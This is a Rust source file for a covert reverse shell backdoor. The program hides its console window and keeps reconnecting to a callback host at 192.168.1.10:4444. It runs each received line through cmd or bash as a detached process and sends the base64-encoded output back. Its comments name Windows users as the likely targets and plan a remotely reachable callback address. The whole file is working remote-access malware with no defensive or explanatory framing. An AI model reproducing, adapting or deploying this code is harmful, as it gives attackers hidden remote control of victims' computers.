#![windows_subsystem = "windows"]

use std::{
    env,
    io::{BufRead, BufReader, Write},
    net::TcpStream,
    process::Command,
    thread,
    time::Duration,
    os::windows::process::CommandExt
};

#[cfg(target_os = "windows")]
const SHELL: [&str; 2] = ["cmd", "/c"];
#[cfg(not(target_os = "windows"))]
const SHELL: [&str; 2] = ["bash", "-c"];

const DETACHED_PROCESS: u32 = 0x00000008;

fn main() {
    loop {
        match TcpStream::connect("192.168.1.10:4444") {
            // Will change to something that can be remotely read from
            Err(_) => {
                thread::sleep(Duration::from_millis(5000));
                continue;
            }
            Ok(mut stream) => loop {
                let mut packet = BufReader::new(&mut stream);
                let mut input = vec![];

                match packet.read_until(10, &mut input) {
                    Ok(bytes) => {
                        if bytes == 0 {
                            break;
                        } else {
                            let cmd = String::from_utf8_lossy(&input[0..input.len() - 1]);

                            #[cfg(target_os = "windows")]
                            let _ = match Command::new(SHELL[0]).args(&[SHELL[1], &cmd]).creation_flags(DETACHED_PROCESS).output() {
                                Ok(output) => {
                                    if cmd.starts_with("cd") {
                                        let _ = env::set_current_dir(
                                            cmd.split_whitespace().nth(1).expect(
                                                "The system cannot find the path specified.",
                                            ),
                                        );
                                    }
                                    let _ = stream.write_all(
                                        (base64::encode(output.stdout) + "\n").as_bytes(),
                                    );
                                    stream.write_all(
                                        (base64::encode(output.stderr) + "\n").as_bytes(),
                                    )
                                }
                                Err(error) => {
                                    stream.write_all((error.to_string() + "\n").as_bytes())
                                }
                            };

                            #[cfg(not(target_os = "windows"))]
                            // Low priority as most users will be on Windows
                            let _ = match Command::new(SHELL[0]).args(&[SHELL[1], &cmd]).output() {
                                Ok(output) => {
                                    if cmd.starts_with("cd") {
                                        let _ = env::set_current_dir(
                                            cmd.split_whitespace().nth(1).expect(
                                                "The system cannot find the path specified.",
                                            ),
                                        );
                                    }
                                    let _ = stream.write_all(
                                        (base64::encode(output.stdout) + "\n").as_bytes(),
                                    );
                                    stream.write_all(
                                        (base64::encode(output.stderr) + "\n").as_bytes(),
                                    )
                                }
                                Err(error) => {
                                    stream.write_all((error.to_string() + "\n").as_bytes())
                                }
                            };

                        }
                    }
                    Err(_) => {
                        break;
                    }
                }
            },
        }
    }
}
